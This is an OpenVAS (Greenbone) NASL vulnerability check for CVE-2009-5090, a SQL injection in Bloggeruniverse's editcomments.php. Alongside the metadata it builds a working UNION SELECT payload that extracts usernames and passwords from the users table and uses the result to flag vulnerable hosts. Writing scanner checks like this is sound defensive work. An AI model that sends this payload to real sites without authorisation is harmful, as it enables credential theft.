if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902632" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-09-27 17:29:53 +0200 (Tue, 27 Sep 2011)" );
	script_cve_id( "CVE-2009-5090" );
	script_bugtraq_id( 33744 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Bloggeruniverse 'editcomments.php' SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/8043/" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/48697" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code." );
	script_tag( name: "affected", value: "Bloggeruniverse version 2 Beta." );
	script_tag( name: "insight", value: "The flaw is due to input passed via the 'id' parameter to
  'editcomments.php' is not properly sanitised before being used in SQL queries." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Bloggeruniverse and is prone to sql injection
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/bloggeruniverse", "/blog", "/bg", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, "Bloggeruniverse" ) && ContainsString( res, "CopyRight &copy;" )){
		url = dir + "/editcomments.php?id=-2%20union%20all%20select%201,2,3,4,5" + ",6,concat(0x" + vt_strings["lowercase_hex"] + ",0x3a,username,0x3a,password,0x3a,0" + "x" + vt_strings["lowercase_hex"] + "),8%20from%20users";
		if(http_vuln_check( port: port, url: url, pattern: ">" + vt_strings["lowercase"] + ":(.+):(.+):" + vt_strings["lowercase"] )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

